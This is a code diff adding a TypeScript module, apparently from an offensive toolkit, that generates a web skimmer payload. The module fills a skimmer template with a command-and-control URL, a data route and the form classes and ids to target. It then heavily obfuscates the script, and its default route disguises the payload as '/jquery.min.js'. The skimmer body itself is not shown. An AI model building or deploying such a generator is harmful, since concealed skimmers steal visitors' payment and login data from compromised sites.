@@ -1,0 +1,120 @@
+import * as fs from "fs";
+import * as jsObfuscator from "javascript-obfuscator";
+
+import { Constants, emsg } from "../utils/utils";
+import BaseModule from "./base";
+
+const SKIMMER_PAYLOAD_TEMPLATE_PATH = "payloads/skimmer.js";
+
+export type SkimmerConfig = {
+    payload_route: string;
+    data_route: string;
+    url: string;
+    target_classes: string[];
+    target_ids: string[];
+};
+
+export default class SkimmerModule extends BaseModule {
+    payload: string;
+    config: SkimmerConfig;
+
+    constructor(protected configFile) {
+        super("skimmer", configFile);
+
+        this.config = {
+            payload_route: "/jquery.min.js",
+            data_route: "/stats",
+            url: "",
+            target_classes: [],
+            target_ids: [],
+        };
+        this.config = this.loadConfig();
+
+        this.defineCommands({
+            generate: {
+                arguments: [],
+                description: "generate skimmer payload with the specified url and target classes and ids",
+                execute: this.run,
+            },
+            "set url": {
+                arguments: ["<url>"],
+                description: "set the external skimmer c2 url (http://skimmer.url)",
+                validateRegex: Constants.VALID_URL_REGEX,
+                execute: (params: string[]) => {
+                    this.config.url = params[0];
+                },
+            },
+            "set data_route": {
+                arguments: ["<route>"],
+                description: "set the skimmer url data route (/stats)",
+                validateRegex: Constants.VALID_ROUTE_REGEX,
+                execute: (params: string[]) => {
+                    this.config.data_route = params[0];
+                },
+            },
+            "set target_classes": {
+                arguments: ["<class 1,class 2,class 3>"],
+                description: "(optional) target classes with skimmer click handler, separated by comma",
+                validateRegex: Constants.VALID_CLASS_ID_REGEX,
+                execute: (params: string[]) => {
+                    const classes = params[0].split(",");
+                    this.config.target_classes = [...new Set(classes)];
+                },
+            },
+            "set target_ids": {
+                arguments: ["<id 1,id 2,id 3>"],
+                description: "(optional) target ids with skimmer click handler, separated by comma",
+                validateRegex: Constants.VALID_CLASS_ID_REGEX,
+                execute: (params: string[]) => {
+                    const ids = params[0].split(",");
+                    this.config.target_ids = [...new Set(ids)];
+                },
+            },
+        });
+
+        this.payload = "";
+    }
+
+    run(params?: string[]) {
+        if (!this.config.url) throw new Error(`skimmer url is required, see 'help'`);
+
+        let data: Buffer;
+        let skimmerJs = "";
+        try {
+            data = fs.readFileSync(SKIMMER_PAYLOAD_TEMPLATE_PATH);
+            skimmerJs = data.toString();
+        } catch (ex) {
+            throw new Error(`failed to generate payload: ${emsg(ex)}`);
+        }
+
+        const targetClasses = "['" + this.config.target_classes.join("','") + "']";
+        const targetIds = "['" + this.config.target_ids.join("','") + "']";
+        const targetUrl = this.config.url;
+        const targetDataRoute = this.config.data_route;
+
+        skimmerJs = skimmerJs.replace(/\[SKIMMER_URL\]/, targetUrl);
+        skimmerJs = skimmerJs.replace(/\[SKIMMER_DATA_ROUTE\]/, targetDataRoute);
+        skimmerJs = skimmerJs.replace(/\[SKIMMER_CLASSES\]/, targetClasses);
+        skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
+        skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");
+
+        let obfs: jsObfuscator.ObfuscationResult;
+        try {
+            obfs = jsObfuscator.obfuscate(skimmerJs, {
+                compact: true,
+                controlFlowFlattening: true,
+                transformObjectKeys: true,
+                log: false,
+                renameGlobals: true,
+                stringArray: true,
+                stringArrayEncoding: ["rc4"],
+                identifierNamesGenerator: "mangled",
+            });
+            this.payload = obfs.getObfuscatedCode();
+        } catch (ex) {
+            throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
+        }
+
+        return { message: `skimmer payload set to: \n${this.payload}` };
+    }
+}
